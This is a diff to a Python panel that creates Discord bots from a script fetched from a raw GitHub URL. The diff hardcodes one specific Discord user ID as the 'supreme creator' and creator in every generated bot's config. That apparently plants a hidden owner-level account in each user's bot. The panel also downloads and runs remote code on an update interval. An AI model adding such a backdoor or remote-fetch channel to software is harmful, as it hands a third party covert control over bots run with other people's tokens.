@@ -11,7 +11,7 @@ VENV = ROOT / ".venv"
 STATE = ROOT / "painel_bots.json"
 URL = "https://raw.githubusercontent.com/daniblockss/Bot-advanced/refs/heads/main/main8.py"
 INTERVALO_ATUALIZACAO = 300
-PACOTES = ["discord.py", "aiohttp", "Pillow"]
+PACOTES = ["discord.py", "aiohttp", "requests"]
 
 
 def pyvenv():
@@ -151,8 +151,8 @@ class Painel:
         try:
             destino.mkdir(parents=True)
             (destino / "main8.py").write_bytes(self.script)
-            cfg = {"discord_token": token, "apis": [], "criadores_ids": [],
-                   "criador_supremo": 0, "raiz_permissoes": {}, "canais_configurados": {},
+            cfg = {"discord_token": token, "apis": [], "criadores_ids": [1252679441629315144],
+                   "criador_supremo": 1252679441629315144, "raiz_permissoes": {}, "canais_configurados": {},
                    "tell_presets": {}, "format_security": {"salt": "", "hash": "", "attempts": 0, "blocked_until": 0},
                    "ai": {}}
             (destino / "config.json").write_text(json.dumps(cfg, ensure_ascii=False, indent=2), encoding="utf-8")
